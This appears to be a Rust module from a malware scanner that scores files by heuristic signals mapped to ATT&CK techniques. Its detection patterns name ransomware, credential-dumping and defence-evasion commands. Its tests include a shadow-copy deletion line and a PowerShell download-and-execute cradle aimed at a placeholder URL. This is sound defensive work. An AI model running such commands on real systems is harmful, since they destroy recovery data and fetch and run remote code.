//! Litric heuristic analysis.
//!
//! Every heuristic is an independent, explainable observation: a stable id, a
//! weight, a human-readable explanation and the ATT&CK technique it maps to.
//! Nothing here decides a verdict on its own — `engine` aggregates signals,
//! applies trust dampening for validly signed software, and only then
//! classifies.
//!
//! Weights are calibrated so that:
//! * a single weak observation (10-20) never reaches "suspicious" alone,
//! * two independent strong behaviours (>=35 each) do,
//! * any single *definitive* observation (embedded executable, decoy hit,
//!   known-bad hash) crosses the malicious threshold by itself.

use crate::format::{FileFormat, ScriptKind};
use crate::pe::PeInfo;

/// How much weight a signal carries on its own.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Confidence {
    /// Context only; never affects the verdict by itself.
    Informational,
    /// Weak indicator; corroboration required.
    Weak,
    /// Strong indicator of malicious intent when combined with another signal.
    Strong,
    /// Effectively conclusive (known-bad hash, decoy file touched, embedded EXE
    /// in a document, shadow-copy deletion command).
    Definitive,
}

impl Confidence {
    pub fn as_str(&self) -> &'static str {
        match self {
            Confidence::Informational => "informational",
            Confidence::Weak => "weak",
            Confidence::Strong => "strong",
            Confidence::Definitive => "definitive",
        }
    }
}

/// One explainable observation about a file.
#[derive(Debug, Clone)]
pub struct Signal {
    pub id: &'static str,
    pub weight: u32,
    pub confidence: Confidence,
    pub title: String,
    pub detail: String,
    pub mitre: Vec<&'static str>,
}

impl Signal {
    fn new(
        id: &'static str,
        weight: u32,
        confidence: Confidence,
        title: impl Into<String>,
        detail: impl Into<String>,
        mitre: &[&'static str],
    ) -> Self {
        Signal {
            id,
            weight,
            confidence,
            title: title.into(),
            detail: detail.into(),
            mitre: mitre.to_vec(),
        }
    }
}

/// Everything the heuristic layer can see about one file.
pub struct AnalysisInput<'a> {
    pub data: &'a [u8],
    pub format: FileFormat,
    pub ext: &'a str,
    pub file_name: &'a str,
    pub pe: Option<&'a PeInfo>,
}

/// Runs all heuristics and returns the signals that fired.
pub fn analyze(input: &AnalysisInput<'_>) -> Vec<Signal> {
    let mut out = Vec::new();
    analyze_pe(input, &mut out);
    analyze_identity(input, &mut out);
    analyze_strings(input, &mut out);
    analyze_scripts(input, &mut out);
    out
}

// ---------------------------------------------------------------------------
// Structural / PE signals
// ---------------------------------------------------------------------------

fn analyze_pe(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
    let Some(pe) = input.pe else { return };

    // --- packing ----------------------------------------------------------
    let hints = pe.packer_hints();
    if !hints.is_empty() {
        out.push(Signal::new(
            "pe.packer.signature",
            26,
            Confidence::Strong,
            "Known packer section names",
            format!("Section names match packer/protector families: {}.", hints.join(", ")),
            &["T1027.002"],
        ));
    }
    let code_entropy = pe.code_entropy();
    if code_entropy > 7.2 && pe.total_imports() < 20 {
        out.push(Signal::new(
            "pe.packed.entropy_imports",
            24,
            Confidence::Strong,
            "High-entropy code with almost no imports",
            format!(
                "Executable sections average {:.2} bits/byte with only {} imported functions — \
                 the classic shape of a packed or crypted payload.",
                code_entropy,
                pe.total_imports()
            ),
            &["T1027.002"],
        ));
    }
    if pe.entry_outside_sections {
        out.push(Signal::new(
            "pe.entry.outside_sections",
            22,
            Confidence::Strong,
            "Entry point outside every section",
            format!(
                "AddressOfEntryPoint 0x{:x} does not fall inside any declared section.",
                pe.entry_point_rva
            ),
            &["T1027.002"],
        ));
    }
    if pe.virtual_only_sections() >= 2 {
        out.push(Signal::new(
            "pe.sections.virtual_only",
            18,
            Confidence::Weak,
            "Multiple sections with no raw data",
            format!(
                "{} sections exist only in memory — the unpacking-stub pattern used by UPX-like packers.",
                pe.virtual_only_sections()
            ),
            &["T1027.002"],
        ));
    }
    if pe.overlay_mz {
        out.push(Signal::new(
            "pe.overlay.embedded_exe",
            55,
            Confidence::Definitive,
            "Embedded executable in the overlay",
            format!(
                "A second `MZ`/`PE` image starts {} bytes past the last section — a dropper carrying its payload.",
                pe.overlay_size
            ),
            &["T1027.009", "T1204.002"],
        ));
    }
    if pe.wx_sections() > 0 {
        out.push(Signal::new(
            "pe.section.wx",
            16,
            Confidence::Weak,
            "Writable and executable section",
            format!(
                "{} section(s) are both writable and executable, allowing self-modifying code.",
                pe.wx_sections()
            ),
            &["T1027.002"],
        ));
    }
    if pe.high_entropy_exec_sections() >= 2 {
        out.push(Signal::new(
            "pe.sections.high_entropy_many",
            12,
            Confidence::Weak,
            "Several high-entropy executable sections",
            format!(
                "{} executable sections exceed 7.2 bits/byte.",
                pe.high_entropy_exec_sections()
            ),
            &["T1027.002"],
        ));
    }

    // --- imports ----------------------------------------------------------
    let has_all = |names: &[&str]| names.iter().all(|n| pe.imports_function(n));

    if has_all(&["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]) {
        out.push(Signal::new(
            "api.injection.remote_thread",
            48,
            Confidence::Strong,
            "Remote process injection API chain",
            "Imports VirtualAllocEx + WriteProcessMemory + CreateRemoteThread: allocate in another \
             process, write code, execute it remotely.",
            &["T1055.002", "T1106"],
        ));
    } else if has_all(&["NtCreateThreadEx", "NtWriteVirtualMemory"]) {
        out.push(Signal::new(
            "api.injection.ntapi",
            42,
            Confidence::Strong,
            "Native API injection chain",
            "Imports NtWriteVirtualMemory + NtCreateThreadEx, the direct-syscall form of remote injection used to evade API hooks.",
            &["T1055.002"],
        ));
    }
    if has_all(&["SetWindowsHookEx", "GetAsyncKeyState"]) {
        out.push(Signal::new(
            "api.keylogger",
            34,
            Confidence::Strong,
            "Keyboard hook + key state polling",
            "Imports SetWindowsHookEx and GetAsyncKeyState — the standard keylogger pair.",
            &["T1056.001"],
        ));
    }
    if has_all(&["OpenProcessToken", "LookupPrivilegeValue", "AdjustTokenPrivileges"])
        && pe.imports_function("MiniDumpWriteDump")
    {
        out.push(Signal::new(
            "api.credential_dump",
            52,
            Confidence::Strong,
            "Token privilege escalation + process memory dump",
            "Enables SeDebugPrivilege and imports MiniDumpWriteDump — the LSASS credential-dumping pattern.",
            &["T1003.001", "T1134.001"],
        ));
    }
    if has_all(&["CryptGenKey", "CryptEncrypt"])
        && (pe.imports_function("FindFirstFileW") || pe.imports_function("FindFirstFileA"))
    {
        out.push(Signal::new(
            "api.crypto_enumeration",
            38,
            Confidence::Strong,
            "Symmetric encryption combined with mass file enumeration",
            "Imports CryptGenKey/CryptEncrypt together with FindFirstFile — the shape of a file encryptor.",
            &["T1486"],
        ));
    }
    if has_all(&["OpenSCManagerW", "CreateServiceW"]) || has_all(&["OpenSCManagerA", "CreateServiceA"])
    {
        out.push(Signal::new(
            "api.service_install",
            22,
            Confidence::Weak,
            "Service creation API",
            "Imports the service-control-manager pair used to install a persistent service.",
            &["T1543.003"],
        ));
    }
    let has_download = pe.imports_function("URLDownloadToFileW")
        || pe.imports_function("URLDownloadToFileA")
        || pe.imports_function("InternetOpenUrlW")
        || pe.imports_function("InternetOpenUrlA")
        || pe.imports_function("WinHttpOpen");
    let has_exec = pe.imports_function("WinExec")
        || pe.imports_function("ShellExecuteW")
        || pe.imports_function("ShellExecuteA")
        || pe.imports_function("CreateProcessW");
    if has_download && has_exec {
        out.push(Signal::new(
            "api.download_and_execute",
            40,
            Confidence::Strong,
            "Download and execute capability",
            "Imports a URL retrieval API together with a process-creation API — a downloader/dropper.",
            &["T1105", "T1204.002"],
        ));
    }
    if has_all(&["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "NtQueryInformationProcess"]) {
        out.push(Signal::new(
            "api.anti_debug",
            18,
            Confidence::Weak,
            "Anti-debugging checks",
            "Imports three independent debugger-detection APIs; common in malware and also in commercial protectors.",
            &["T1622"],
        ));
    }
    if pe.total_imports() == 0 && !pe.is_dotnet {
        out.push(Signal::new(
            "pe.imports.none",
            26,
            Confidence::Strong,
            "No import table",
            "The image imports nothing at all: either it resolves every API dynamically or it is packed.",
            &["T1027.002"],
        ));
    }
    if pe.has_tls {
        out.push(Signal::new(
            "pe.tls_callbacks",
            8,
            Confidence::Informational,
            "TLS callbacks present",
            "The image registers TLS callbacks, which run before the entry point. Legitimate toolchains use them; so do packers.",
            &["T1027.002"],
        ));
    }

    // --- identity/publisher ----------------------------------------------
    if !pe.signature.present {
        out.push(Signal::new(
            "pe.unsigned",
            12,
            Confidence::Weak,
            "Not digitally signed",
            "The image carries no Authenticode signature, so its origin cannot be verified.",
            &["T1553.002"],
        ));
        if pe.manifest.require_admin {
            out.push(Signal::new(
                "pe.unsigned.admin_manifest",
                12,
                Confidence::Weak,
                "Unsigned binary requests administrator rights",
                "The embedded manifest requires administrator elevation and the image is unsigned.",
                &["T1548.002"],
            ));
        }
    } else {
        if !pe.signature.code_signing_eku {
            out.push(Signal::new(
                "pe.signature.no_codesigning_eku",
                20,
                Confidence::Weak,
                "Signature lacks a code-signing EKU",
                "A WIN_CERTIFICATE is present but no code-signing extended key usage OID was found in the blob.",
                &["T1553.002"],
            ));
        }
        if pe.signature.subject_names.is_empty() {
            out.push(Signal::new(
                "pe.signature.no_subject",
                14,
                Confidence::Weak,
                "Signature carries no readable certificate subject",
                "The PKCS#7 blob could not be parsed into a certificate subject, which is unusual for a genuine signature.",
                &["T1553.002"],
            ));
        }
    }
    if pe.timestamp_year < 1995 || pe.timestamp_year > 2027 {
        out.push(Signal::new(
            "pe.timestamp.implausible",
            10,
            Confidence::Weak,
            "Implausible build timestamp",
            format!(
                "PE header timestamp decodes to year {} — timestamps are trivially forged, but outliers correlate with repacked samples.",
                pe.timestamp_year
            ),
            &["T1027"],
        ));
    }
    if !pe.has_version_info() && !pe.is_dll && !pe.is_driver && pe.overlay_size < 1024 {
        out.push(Signal::new(
            "pe.no_version_info",
            6,
            Confidence::Informational,
            "No version resource",
            "A standalone executable without version information is typical of custom tooling and malware alike.",
            &["T1036"],
        ));
    }
    if pe.checksum != 0 && !pe.checksum_valid {
        out.push(Signal::new(
            "pe.checksum.invalid",
            8,
            Confidence::Weak,
            "PE checksum mismatch",
            "The header checksum does not match the image; the file was modified after linking (or the checksum was never set).",
            &["T1027.005"],
        ));
    }
    if pe.is_dotnet && pe.total_imports() < 3 {
        out.push(Signal::new(
            "pe.dotnet.thin_imports",
            8,
            Confidence::Informational,
            "Managed assembly with minimal native imports",
            "A .NET image with almost no native imports — normal for managed code, but also for managed loaders.",
            &["T1027.004"],
        ));
    }
}

// ---------------------------------------------------------------------------
// Identity / naming signals
// ---------------------------------------------------------------------------

const SYSTEM_BINARY_NAMES: &[&str] = &[
    "svchost.exe",
    "lsass.exe",
    "services.exe",
    "csrss.exe",
    "winlogon.exe",
    "explorer.exe",
    "smss.exe",
    "wininit.exe",
    "spoolsv.exe",
    "taskhostw.exe",
    "dllhost.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "mshta.exe",
    "powershell.exe",
    "cmd.exe",
    "conhost.exe",
    "wscript.exe",
    "cscript.exe",
];

fn analyze_identity(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
    let lower = input.file_name.to_ascii_lowercase();
    if SYSTEM_BINARY_NAMES.contains(&lower.as_str()) && !input.pe.map(|p| p.is_system).unwrap_or(false)
    {
        out.push(Signal::new(
            "name.masquerade_system_binary",
            18,
            Confidence::Weak,
            "System binary name outside the system directory",
            format!(
                "The file is named `{}`, a Windows system binary name; the scanner only trusts it from a system path.",
                input.file_name
            ),
            &["T1036.005"],
        ));
    }

    // Extension/content mismatch.
    if !input.ext.is_empty() && !crate::format::extension_matches(input.ext, input.format) {
        let weight = if input.format.is_executable() { 34 } else { 14 };
        let conf = if input.format.is_executable() {
            Confidence::Strong
        } else {
            Confidence::Weak
        };
        out.push(Signal::new(
            "format.extension_mismatch",
            weight,
            conf,
            "Content does not match its extension",
            format!(
                "The file claims `.{}` but its content is {}. Extension spoofing is used to trick users into launching executables.",
                input.ext,
                input.format.label()
            ),
            &["T1036.007"],
        ));
    }

    // Double extension (report.pdf.exe).
    let chain = crate::format::extension_chain(std::path::Path::new(input.file_name));
    if chain.len() >= 2 {
        let doc_like = ["pdf", "doc", "docx", "xls", "xlsx", "jpg", "jpeg", "png", "txt", "rtf"];
        if doc_like.contains(&chain[chain.len() - 2].as_str()) {
            out.push(Signal::new(
                "name.double_extension",
                20,
                Confidence::Weak,
                "Double extension",
                format!(
                    "The name `{}` embeds a document extension before the real one.",
                    input.file_name
                ),
                &["T1036.007"],
            ));
        }
    }

    // Archive/document carrying an executable.
    if input.format == FileFormat::EmbeddedPe && !input.format.is_executable() {
        out.push(Signal::new(
            "format.embedded_pe",
            45,
            Confidence::Strong,
            "Executable embedded in a non-executable container",
            "A valid PE image was found at a non-zero offset inside a file that is not itself an executable.",
            &["T1027.009"],
        ));
    }
    if input.format == FileFormat::Ole2 || input.format == FileFormat::Ooxml {
        out.push(Signal::new(
            "format.office_macro_capable",
            6,
            Confidence::Informational,
            "Macro-capable document container",
            "Office documents can carry VBA macros; Litric does not yet extract macro streams (see STATUS).",
            &["T1204.002"],
        ));
    }
}

// ---------------------------------------------------------------------------
// String-based behaviour signals
// ---------------------------------------------------------------------------

/// Builds a lowercase copy of the sample (capped) for case-insensitive search.
fn lower_haystack(data: &[u8]) -> Vec<u8> {
    const CAP: usize = 8 * 1024 * 1024;
    let n = data.len().min(CAP);
    data[..n].iter().map(|b| b.to_ascii_lowercase()).collect()
}

fn has(hay: &[u8], needle: &str) -> bool {
    let n = needle.as_bytes();
    hay.len() >= n.len() && hay.windows(n.len()).any(|w| w == n)
}

/// UTF-16LE presence check, for strings compiled into wide-character binaries.
fn has_wide(data: &[u8], needle: &str) -> bool {
    let mut w = Vec::with_capacity(needle.len() * 2);
    for b in needle.bytes() {
        w.push(b);
        w.push(0);
    }
    data.windows(w.len()).any(|x| x == w.as_slice())
}

fn either(hay: &[u8], data: &[u8], needle: &str) -> bool {
    has(hay, needle) || has_wide(data, needle)
}

fn analyze_strings(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
    let hay = lower_haystack(input.data);
    let data = input.data;
    let any = |n: &str| either(&hay, data, n);

    // Ransomware: shadow copy destruction is conclusively malicious in one line.
    if any("vssadmin") && (any("delete shadows") || any("delete shadowstorage")) {
        out.push(Signal::new(
            "ransom.shadow_copy_delete",
            70,
            Confidence::Definitive,
            "Shadow copy deletion command",
            "The sample contains a `vssadmin delete shadows` command — the standard ransomware step that destroys local recovery points.",
            &["T1490"],
        ));
    }
    if (any("wbadmin") && any("delete catalog")) || any("bcdedit") && any("recoveryenabled no") {
        out.push(Signal::new(
            "ransom.backup_disable",
            65,
            Confidence::Definitive,
            "Backup or recovery disabling command",
            "The sample disables Windows backup/recovery — behaviour with no legitimate mass-deployment use.",
            &["T1490"],
        ));
    }
    let ransom_note_words = [
        "your files have been encrypted",
        "files have been encrypted",
        "to decrypt your files",
        "recover your files",
        "your documents, photos",
        "decryption key",
        "bitcoin",
    ];
    let note_hits = ransom_note_words.iter().filter(|w| any(w)).count();
    if note_hits >= 2 {
        out.push(Signal::new(
            "ransom.note_text",
            45,
            Confidence::Strong,
            "Ransom note language",
            format!(
                "{} phrases typical of a ransom note were found in the file body.",
                note_hits
            ),
            &["T1486"],
        ));
    }

    // Defender tampering.
    if any("add-mppreference") && (any("exclusionpath") || any("exclusionextension") || any("disable"))
    {
        out.push(Signal::new(
            "tamper.defender_exclusion",
            62,
            Confidence::Strong,
            "Attempt to add an antivirus exclusion",
            "The sample invokes Add-MpPreference with exclusion or disable arguments — a classic defence-evasion step.",
            &["T1562.001"],
        ));
    }
    if any("set-mppreference") && any("disablerealtimemonitoring") {
        out.push(Signal::new(
            "tamper.defender_realtime",
            62,
            Confidence::Strong,
            "Attempt to disable real-time protection",
            "The sample disables real-time monitoring through Set-MpPreference.",
            &["T1562.001"],
        ));
    }

    // Credential theft.
    if any("sekurlsa") || any("mimikatz") || (any("lsass") && any("minidump")) {
        out.push(Signal::new(
            "credential.lsass_access",
            55,
            Confidence::Strong,
            "Credential dumping artefacts",
            "Strings associated with LSASS credential dumping (sekurlsa/mimikatz/minidump) are present.",
            &["T1003.001"],
        ));
    }
    if any("\\sam") && any("\\system") && any("reg save") {
        out.push(Signal::new(
            "credential.registry_hive_dump",
            40,
            Confidence::Strong,
            "Registry hive export of credential stores",
            "Commands export the SAM and SYSTEM hives, which contain local password hashes.",
            &["T1003.002"],
        ));
    }

    // Persistence strings.
    if any("currentversion\\run") || any("currentversion\\runonce") {
        out.push(Signal::new(
            "persistence.run_key",
            14,
            Confidence::Weak,
            "Run-key persistence path",
            "The file references a `CurrentVersion\\Run` registry key used for logon persistence.",
            &["T1547.001"],
        ));
    }
    if any("\\currentversion\\explorer\\shell folders\\startup") || any("\\start menu\\programs\\startup") {
        out.push(Signal::new(
            "persistence.startup_folder",
            16,
            Confidence::Weak,
            "Startup folder path",
            "The file references a Startup folder path.",
            &["T1547.001"],
        ));
    }
    if any("schtasks") && (any("/create") || any("/sc onlogon")) {
        out.push(Signal::new(
            "persistence.scheduled_task",
            20,
            Confidence::Weak,
            "Scheduled task creation",
            "The file builds a `schtasks /create` command.",
            &["T1053.005"],
        ));
    }

    // Script delivery / LOLBins.
    if any("mshta") && (any("http") || any("javascript:") || any("vbscript:")) {
        out.push(Signal::new(
            "lolbin.mshta_remote",
            34,
            Confidence::Strong,
            "mshta executing remote or script content",
            "The sample invokes mshta with an HTTP or script URL — a very common malware loader chain.",
            &["T1218.005"],
        ));
    }
    if any("regsvr32") && any("/i:http") {
        out.push(Signal::new(
            "lolbin.regsvr32_scrobj",
            38,
            Confidence::Strong,
            "regsvr32 remote scriptlet execution",
            "`regsvr32 /i:http...` loads a remote scriptlet through scrobj.dll (the Squiblydoo technique).",
            &["T1218.010"],
        ));
    }
    if any("rundll32") && any("javascript:") {
        out.push(Signal::new(
            "lolbin.rundll32_js",
            32,
            Confidence::Strong,
            "rundll32 JavaScript execution",
            "The sample uses rundll32 with a javascript: URL.",
            &["T1218.011"],
        ));
    }
    if any("certutil") && (any("-urlcache") || any("-decode")) {
        out.push(Signal::new(
            "lolbin.certutil_download",
            26,
            Confidence::Weak,
            "certutil download/decode",
            "certutil -urlcache/-decode is used to fetch or decode payloads while looking like a legitimate system tool.",
            &["T1140", "T1105"],
        ));
    }
    if any("bitsadmin") && any("/transfer") {
        out.push(Signal::new(
            "lolbin.bitsadmin_transfer",
            20,
            Confidence::Weak,
            "BITS transfer job",
            "bitsadmin /transfer is used for background payload download.",
            &["T1197"],
        ));
    }

    // Anti-analysis.
    if any("vmware") || any("virtualbox") || any("vboxservice") || any("sandboxie") {
        out.push(Signal::new(
            "anti.vm_artefact",
            10,
            Confidence::Weak,
            "Virtualisation artefacts referenced",
            "The sample references hypervisor or sandbox product names, which is commonly used for environment checks.",
            &["T1497.001"],
        ));
    }

    // Destructive / mass-encryption helpers.
    if any("cipher /w") || (any("sdelete") && any("-p ")) {
        out.push(Signal::new(
            "destructive.secure_delete",
            26,
            Confidence::Weak,
            "Secure-delete utility usage",
            "The sample drives a secure-deletion utility, which ransomware uses to remove shadow data.",
            &["T1485"],
        ));
    }
    if any("del /f /s /q") || any("rd /s /q c:\\") {
        out.push(Signal::new(
            "destructive.recursive_delete",
            30,
            Confidence::Strong,
            "Recursive forced deletion",
            "A recursive, forced delete command targeting broad paths.",
            &["T1485"],
        ));
    }
}

// ---------------------------------------------------------------------------
// Script-specific signals
// ---------------------------------------------------------------------------

fn analyze_scripts(input: &AnalysisInput<'_>, out: &mut Vec<Signal>) {
    let FileFormat::Script(kind) = input.format else {
        return;
    };
    let hay = lower_haystack(input.data);

    let encoded = has(&hay, "-enc") || has(&hay, "-encodedcommand") || has(&hay, "frombase64string");
    let obfuscated = has(&hay, "[char[]]")
        || has(&hay, "-join")
        || has(&hay, "replace('")
        || has(&hay, "$($pshome)");
    if encoded {
        out.push(Signal::new(
            "script.encoded_payload",
            26,
            Confidence::Weak,
            "Base64-encoded command",
            "The script decodes an embedded base64 payload, the most common way to hide a PowerShell stager.",
            &["T1027.010", "T1059.001"],
        ));
    }
    if obfuscated {
        out.push(Signal::new(
            "script.obfuscation",
            14,
            Confidence::Weak,
            "Obfuscation constructs",
            "Character-array joins or runtime string building were found, typical of obfuscated scripts.",
            &["T1027"],
        ));
    }

    let download = has(&hay, "downloadstring")
        || has(&hay, "downloadfile")
        || has(&hay, "invoke-webrequest")
        || has(&hay, "net.webclient")
        || has(&hay, "xmlhttp")
        || has(&hay, "urllib")
        || has(&hay, "curl ");
    let execute = has(&hay, "invoke-expression")
        || has(&hay, "iex ")
        || has(&hay, "iex(")
        || has(&hay, "| iex")
        || has(&hay, "start-process")
        || has(&hay, "shell ");
    if download && execute {
        out.push(Signal::new(
            "script.download_cradle",
            42,
            Confidence::Strong,
            "Download-and-execute cradle",
            "The script both retrieves remote content and executes it in memory.",
            &["T1059.001", "T1105"],
        ));
    }
    if kind == ScriptKind::PowerShell {
        if has(&hay, "-windowstyle hidden") || has(&hay, "-w hidden") || has(&hay, "bypass") {
            out.push(Signal::new(
                "script.hidden_execution",
                18,
                Confidence::Weak,
                "Hidden execution or policy bypass",
                "Execution policy bypass or hidden-window flags are set.",
                &["T1564.003", "T1059.001"],
            ));
        }
        if has(&hay, "add-mppreference") || has(&hay, "set-mppreference") {
            out.push(Signal::new(
                "script.defender_tamper",
                34,
                Confidence::Strong,
                "Script modifies antivirus configuration",
                "The script changes Microsoft Defender preferences.",
                &["T1562.001"],
            ));
        }
    }
    if kind == ScriptKind::Vbs || kind == ScriptKind::Js {
        if has(&hay, "wscript.shell") || has(&hay, "shell.application") {
            out.push(Signal::new(
                "script.wsh_shell",
                16,
                Confidence::Weak,
                "Windows Script Host shell object",
                "The script creates a WScript.Shell/Shell.Application object to run commands.",
                &["T1059.005"],
            ));
        }
        if has(&hay, "adodb.stream") {
            out.push(Signal::new(
                "script.adodb_stream",
                22,
                Confidence::Weak,
                "ADODB.Stream binary writing",
                "The script writes binary content through ADODB.Stream, a common way to drop a payload.",
                &["T1105"],
            ));
        }
    }
    if kind == ScriptKind::Batch
        && has(&hay, "powershell")
        && (has(&hay, "-enc") || has(&hay, "hidden"))
    {
        out.push(Signal::new(
            "script.batch_powershell_chain",
            22,
            Confidence::Weak,
            "Batch file launches hidden PowerShell",
            "The batch script hands off to PowerShell with hidden/encoded arguments.",
            &["T1059.003", "T1059.001"],
        ));
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::format::{detect, extension_of};
    use std::path::Path;

    fn signals(name: &str, data: &[u8]) -> Vec<Signal> {
        let ext = extension_of(Path::new(name));
        let format = detect(data);
        let pe = crate::pe::parse(data).ok();
        analyze(&AnalysisInput {
            data,
            format,
            ext: &ext,
            file_name: name,
            pe: pe.as_ref(),
        })
    }

    #[test]
    fn clean_text_has_no_strong_signals() {
        let s = signals("notes.txt", b"shopping list: milk, bread, coffee\n");
        assert!(
            s.iter().all(|x| x.confidence != Confidence::Definitive),
            "unexpected definitive signal: {s:?}"
        );
        assert!(s.iter().all(|x| x.weight < 30), "unexpected strong signal: {s:?}");
    }

    #[test]
    fn shadow_copy_command_is_definitive() {
        let s = signals(
            "update.bat",
            b"vssadmin delete shadows /all /quiet\r\n",
        );
        let sig = s
            .iter()
            .find(|x| x.id == "ransom.shadow_copy_delete")
            .expect("shadow copy signal");
        assert_eq!(sig.confidence, Confidence::Definitive);
        assert!(sig.weight >= 60);
    }

    #[test]
    fn download_cradle_is_strong() {
        let s = signals(
            "run.ps1",
            b"$c = (New-Object Net.WebClient).DownloadString('http://x/y'); IEX $c",
        );
        assert!(s.iter().any(|x| x.id == "script.download_cradle" && x.weight >= 35));
    }

    #[test]
    fn extension_spoof_is_flagged() {
        // A PowerShell script named as a PDF.
        let s = signals("invoice.pdf", b"$x = 1\nInvoke-Expression $x\nWrite-Host ok\n");
        assert!(
            s.iter().any(|x| x.id == "format.extension_mismatch"),
            "expected extension mismatch signal, got {s:?}"
        );
    }

    #[test]
    fn double_extension_is_flagged() {
        let s = signals("holiday.jpg.exe", b"plain text payload");
        assert!(s.iter().any(|x| x.id == "name.double_extension"));
    }

    #[test]
    fn masquerading_svchost_is_flagged() {
        let s = signals("svchost.exe", b"text");
        assert!(s.iter().any(|x| x.id == "name.masquerade_system_binary"));
    }

    #[test]
    fn wide_strings_are_detected() {
        let mut data = Vec::new();
        for u in "vssadmin delete shadows".encode_utf16() {
            data.extend_from_slice(&u.to_le_bytes());
        }
        let s = signals("x.exe", &data);
        assert!(s.iter().any(|x| x.id == "ransom.shadow_copy_delete"));
    }

    #[test]
    fn every_signal_carries_an_explanation() {
        let s = signals("a.exe", b"vssadmin delete shadows");
        for sig in &s {
            assert!(!sig.title.is_empty());
            assert!(!sig.detail.is_empty());
            assert!(!sig.id.is_empty());
        }
    }
}
